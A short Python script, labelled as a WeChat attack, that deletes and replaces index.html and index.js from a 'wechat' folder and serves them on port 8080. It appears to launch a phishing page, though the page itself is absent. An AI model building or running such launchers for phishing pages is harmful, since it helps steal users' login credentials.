#use wechat attack
#code : python
from __future__ import print_function
import os
os.system("chmod +x ./")
print("finish the file : set.py...")
print("finish the file : logon.py...")
print("finish the file : index.html")
print("finish the file : index.js")
#show 

#import os
#os....
import os
os.system("rm -f index.html")
os.system("rm -f index.js")
os.system("cp wechat/index.html ./")
os.system("cp wechat/index.js ./")
#to optioning the file and start port 8080 then
print("start the http port 8080 on http://127.0.0.1:8080 and http://localhost:8080")
os.system("python3 -m http.server 8080")
#start the port 8089
#and attacker can visit on 127.0.0.1:8080 or localhost:8080
